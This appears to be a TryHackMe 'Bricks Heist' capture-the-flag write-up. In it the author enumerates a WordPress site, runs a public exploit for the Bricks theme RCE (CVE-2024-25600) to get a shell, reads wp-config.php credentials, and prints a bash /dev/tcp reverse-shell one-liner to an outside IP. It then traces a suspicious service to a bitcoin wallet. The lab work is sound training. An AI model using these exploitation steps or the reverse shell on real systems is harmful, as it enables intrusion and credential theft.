![](Screenshots/Pasted%20image%2020251111003614.png)


```bash 
echo "10.10.185.216 bricks.thm" | sudo tee -a /etc/hosts

sudo sed -i '/bricks.thm/d;' /etc/hosts

```

We have to apply the -k
```bash
┌──(javnievic㉿kali)-[~/kali-lab/Tryhackme/machines/TryHack3M:-Bricks-Heist]
└─$ curl -k -I https://bricks.thm

HTTP/2 200 
link: <https://bricks.thm/wp-json/>; rel="https://api.w.org/"
content-type: text/html; charset=UTF-8
date: Mon, 10 Nov 2025 23:35:01 GMT
server: Apache

```

![](Screenshots/Pasted%20image%2020251111004309.png)

![](Screenshots/Pasted%20image%2020251111004209.png)



```bash
wpscan --url https://bricks.thm --disable-tls-checks
```
u = users, vt = vulnerable themes, ap = all plugins. WPScan may ask for an API token for vuln data; run without token to get enumeration results.

`
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
`


- **The site runs WordPress 6.5** (outdated) and uses the **Bricks** theme (`/wp-content/themes/bricks/`) version **~1.9.5**. [WPScan+1](https://wpscan.com/wordpress/65/)
    
- **Bricks <= 1.9.6 has a known unauthenticated RCE (CVE-2024-25600)** that affects 1.9.5 and provides an easy foothold (many public exploits exist). That is the _most likely_ immediate path to remote code execution on this lab.



We will run the exploit of this repo: https://github.com/so1icitx/CVE-2024-25600: 
```bash
┌──(javnievic㉿kali)-[~/kali-lab/Tryhackme/machines/TryHack3M:-Bricks-Heist]
└─$ ls                                                      
CVE-2024-25600
                                                                                                                                                                                                                                            
┌──(javnievic㉿kali)-[~/kali-lab/Tryhackme/machines/TryHack3M:-Bricks-Heist]
└─$ cd CVE-2024-25600
                                                                                                                                                                                                                                            
┌──(javnievic㉿kali)-[~/…/Tryhackme/machines/TryHack3M:-Bricks-Heist/CVE-2024-25600]
└─$ ls
'IF OTHER DOESNT WORK TRY THIS.py'   LICENSE   README.md   exploit.py
                                                                                                                                                                                                                                            
┌──(javnievic㉿kali)-[~/…/Tryhackme/machines/TryHack3M:-Bricks-Heist/CVE-2024-25600]
└─$ python3 exploit.py -u https://bricks.thm     
```

Exploiting it: 

```bash
┌──(javnievic㉿kali)-[~/…/Tryhackme/machines/TryHack3M:-Bricks-Heist/CVE-2024-25600]
└─$ python3 exploit.py -u https://bricks.thm               
[*] Nonce found: 0411267c56
[+] https://bricks.thm is vulnerable to CVE-2024-25600: apache
[!] Shell ready! Type commands (exit to quit)
# 
```

![](Screenshots/Pasted%20image%2020251111112122.png)

Firstly we prove the wp-config.php file:

![](Screenshots/Pasted%20image%2020251111112046.png)

We discovered the root user paswd.
We also can do a reverse shell: 
`bash -c 'exec bash -i &>/dev/tcp/10.8.87.146/4444 <&1'`

We can access to the db "https://bricks.thm/phpmyadmin", 

We have to view al the service running:
`systemctl list-units --type=service --state=running`

![](Screenshots/Pasted%20image%2020251111195132.png)

We check the status of the strange "ubuntu.service"
`systemctl status ubuntu.service`

![](Screenshots/Pasted%20image%2020251111195834.png)

```bash 
apache@ip-10-10-3-158:/data/www/default$ ls /lib/NetworkManager
ls /lib/NetworkManager
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections
```

The log file of the nm-inet-dialog is inet.conf:
`apache@ip-10-10-3-158:/lib/NetworkManager$ cat inet.conf`

![](Screenshots/Pasted%20image%2020251111201839.png)

We have the id "5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
":

Decoding it in cyberchef: 
![](Screenshots/Pasted%20image%2020251111210709.png)


bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa

Checking both (https://bitref.com/):
![](Screenshots/Pasted%20image%2020251111210935.png)
